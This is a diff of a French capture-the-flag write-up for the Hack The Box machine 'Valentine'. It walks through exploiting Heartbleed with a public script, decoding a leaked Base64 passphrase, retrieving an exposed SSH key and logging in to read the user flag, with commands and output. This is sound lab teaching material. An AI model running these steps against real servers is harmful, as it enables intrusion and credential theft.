@@ -300,9 +300,13 @@ PORT      STATE         SERVICE
 ### Scan des répertoires
 Pour la partie découverte de chemins web, j'utilise mon script dédié {{< script "mon-recoweb" >}}
 
+```bash
+mon-recoweb valentine.htb
+```
+
 Voici le résultat repris dans le fichier `scans-recoweb/RESULTS_SUMMARY.txt`
 
-```txt
+```bash
 ===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
 Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
 Script              : mon-recoweb v2.1.0
@@ -402,7 +406,7 @@ Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdoma
 
 Voici les résultats repris dans le fichier `scans_subdomains/scan_vhosts.txt`
 
-```txt
+```bash
 === mon-subdomains valentine.htb START ===
 Script       : mon-subdomains
 Version      : mon-subdomains 2.0.0
@@ -462,9 +466,13 @@ Après avoir appliqué une série de ces techniques en commençant par `stegseek
 
 Lors du **scan agressif**, Nmap met en évidence la présence d'une vulnérabilité critique : **[Heartbleed](https://fr.wikipedia.org/wiki/Heartbleed) (littéralement “cœur qui saigne”) – CVE-2014-0160** sur le service TLS. Le nom de la machine — *Valentine* — et l'image d'un **cœur brisé** affichée sur la page web orientent immédiatement vers cette faille célèbre, **découverte le jour de la Saint-Valentin**. Heartbleed touche l'extension TLS Heartbeat et permet à un attaquant de lire arbitrairement des fragments de mémoire du serveur. Tous ces indices convergent et indiquent clairement que l'exploitation de **Heartbleed** constitue le point d'entrée logique pour obtenir le foothold.
 
-- exploitation
+#### heartbleed.py
 
-[heartbleed.py](https://github.com/injcristianrojas/heartbleed-example/blob/master/heartbleed.py)
+Tu peux télécharger **heartbleed.py** depuis le dépôt GitHub de [injcristianrojas](https://github.com/injcristianrojas/heartbleed-example) et suivre ses instructions.
+
+Le script est ancien et a été écrit pour **Python 2**. Il est donc préférable de l’exécuter avec `python2` afin d’éviter tout problème de compatibilité ou d’erreurs de syntaxe.
+
+Commande de lancement et affichage de l’aide :
 
 ```bash
 python2 heartbleed.py
@@ -496,11 +504,13 @@ Options:
 
 ```
 
-
+Tu lances ensuite l’exploit contre la cible **valentine.htb**, en effectuant plusieurs itérations afin d’augmenter les chances de fuite mémoire :
 
 ```bash
-python2 heartbleed.py valentine.htb -n 5 
+python2 heartbleed.py valentine.htb -n 5
+```
 
+```bash
 defribulator v1.16
 A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
 
@@ -576,17 +586,57 @@ $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..y.....*....!.!.I.#.............+....
 
 ```
 
-- on retrouve à chaque fois 
+#### Exploitation
 
-```text
-$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg
+La sortie confirme clairement que le serveur est vulnérable à **Heartbleed (CVE-2014-0160)** :
+
+```
+WARNING: valentine.htb:443 returned more data than it should - server is vulnerable!
 ```
 
-qui décodé Base64 donne **heartbleedbelievethehype** qui pourrait bien être un **mot de passe**.
+Au milieu des données mémoire retournées, on retrouve à plusieurs reprises le même fragment HTTP contenant une variable intéressante :
 
-###  hype_key et connexion
+```bash
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
+```
+
+Cette valeur apparaît de façon récurrente dans les fuites mémoire, ce qui attire l’attention.
+ Il s’agit manifestement d’une chaîne encodée en **Base64**.
+
+Décodage de la valeur :
+
+```
+echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 --decode
+```
+
+Résultat :
+
+```
+heartbleedbelievethehype
+```
+
+La chaîne décodée **heartbleedbelievethehype** ressemble fortement à un **mot de passe**, ce qui en fait un excellent candidat à tester lors des étapes suivantes de l’exploitation.
+
+###  Exploration des répertoires exposés
+
+Lors de la phase d’énumération, le scan des répertoires web a permis d’identifier plusieurs chemins accessibles sur le serveur. Même lorsque cette étape semble peu prometteuse, il est important de les examiner manuellement : des fichiers sensibles sont parfois laissés accessibles par négligence.
+
+Parmi les répertoires mis en évidence, **/dev** retient rapidement ton attention. Il ne s’agit pas ici du répertoire système Linux classique, mais bien d’un dossier exposé via le serveur web.
+
+L’index de ce répertoire révèle alors la présence de deux fichiers intéressants :
+
+- **hype_key**
+- **notes.txt**
+
+Ces fichiers constituent des pistes évidentes pour la suite de l’exploitation et méritent d’être analysés plus en détail.
 
 ![Affichage du répertoire /dev accessible via le navigateur web](dir_dev.png)
+
+#### Récupération et analyse des fichiers du répertoire /dev
+
+Tu commences par récupérer localement les deux fichiers exposés dans le répertoire **/dev** à l’aide de `curl`.
+
+Téléchargement de **notes.txt** :
 
 ```bash
 curl -o notes.txt http://valentine.htb/dev/notes.txt
@@ -595,6 +645,8 @@ curl -o notes.txt http://valentine.htb/dev/notes.txt
 100   227  100   227    0     0  10972      0 --:--:-- --:--:-- --:--:-- 10809
 ```
 
+Téléchargement de **hype_key** :
+
 ```bash
 curl -o hype_key http://valentine.htb/dev/hype_key
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -602,7 +654,9 @@ curl -o hype_key http://valentine.htb/dev/hype_key
 100  5383  100  5383    0     0   275k      0 --:--:-- --:--:-- --:--:--  276k
 ```
 
-- Le fichier `/dev/notes.txt` ne contient qu'une simple todo list interne et n'apporte aucun élément exploitable pour la suite de l'attaque.
+#### Analyse de notes.txt
+
+Le fichier **notes.txt** contient uniquement une liste de tâches internes :
 
 ```texte
 To do:
@@ -615,42 +669,59 @@ To do:
 6) Find a better way to take notes.
 ```
 
+Aucun élément directement exploitable n’apparaît ici.
+ En revanche, ces notes confirment l’existence d’un mécanisme d’encodage/décodage mal maîtrisé, ce qui renforce la cohérence des données récupérées précédemment via Heartbleed.
+
+#### Décodage de hype_key
+
+Le fichier **hype_key**, quant à lui, est nettement plus intéressant.
+ Son contenu est encodé en **hexadécimal**.
+
+Tu procèdes au décodage hex → brut à l’aide de **[CyberChef](https://gchq.github.io/CyberChef/)**, ce qui permet d’obtenir une clé privée SSH exploitable, que tu sauvegardes sous le nom **hype_key_decoded**.
 
 
-- décodage de hype_key `hex` vers **hype_key_decoded** se passe dans [cyberchef](https://gchq.github.io/CyberChef/) et voici le résultat:
 
 ![Décodage hexadécimal de hype_key vers hype_key_decoded dans CyberChef](cyberchef_hype_key.png)
 
-- création 'copier/coller' dans nano du fichier hype_key_decoded et dans mon cas, puisque je travaille dans un share windows, copie vers /home/kali/tmp
+#### Préparation de la clé SSH
+
+Après avoir copié le contenu décodé dans un fichier local (`hype_key_decoded`), tu le places dans un répertoire de travail adapté :
 
 ```bash
 mkdir -p /home/kali/tmp
 cp hype_key_decoded /home/kali/tmp/
 ```
 
-- modifications des permissions en 600 et connexion en tant que utilisateur `hype` (logique puis que la clé est hype_key, la clé de hype) avec la clé `hype_key_decoded` le mot de passe `heartbleedbelievethehype`
+Tu ajustes ensuite les permissions du fichier, condition indispensable pour que SSH accepte la clé :
 
 ```bash
 chmod 600 hype_key_decoded
+```
+#### Connexion SSH avec la clé récupérée
 
-ssh -i hype_key_decoded hype@valentine.htb
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-Enter passphrase for key 'hype_key_decoded': 
-Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+Le nom du fichier **hype_key** suggère logiquement qu’il s’agit de la clé SSH de l’utilisateur **hype**.
+ Tu tentes donc une connexion SSH en utilisant cette clé privée.
 
- * Documentation:  https://help.ubuntu.com/
-
-New release '14.04.5 LTS' available.
-Run 'do-release-upgrade' to upgrade to it.
-
-hype@Valentine:~$ 
+```bash
+ssh -i /home/kali/tmp/hype_key_decoded hype@valentine.htb
 ```
 
+La clé est protégée par une passphrase. Tu renseignes alors le mot de passe précédemment récupéré via Heartbleed :
 
+```bash
+heartbleedbelievethehype
+```
+
+La connexion aboutit avec succès et tu obtiens un shell interactif en tant que l’utilisateur **hype** :
+
+```bash
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+hype@Valentine:~$
+```
 
 ### user.txt
+
+Une fois connecté en SSH en tant que l’utilisateur **hype**, tu commences par examiner le contenu de son répertoire personnel afin de repérer d’éventuels fichiers intéressants.
 
 ```bash
 hype@Valentine:~$ ls -l
@@ -665,12 +736,18 @@ drwxr-xr-x 2 hype hype 4096 Dec 11  2017 Templates
 -rw-rw-r-- 1 hype hype   33 Nov 24 06:46 user.txt
 drwxr-xr-x 2 hype hype 4096 Dec 11  2017 Videos
 
+```
+
+Le fichier **user.txt** est directement accessible dans le home de l’utilisateur.
+ Il ne reste plus qu’à l’afficher pour valider l’accès utilisateur.
+
+```bash
 hype@Valentine:~$ cat user.txt
 ef7xxxxxxxxxxxxxxxxxxxxxxxxxxx24e0
 
 ```
 
-
+Tu récupères ainsi le **flag utilisateur**, confirmant la réussite de la phase d’exploitation et l’obtention d’un accès légitime sur la machine.
 
 ## Escalade de privilèges
 
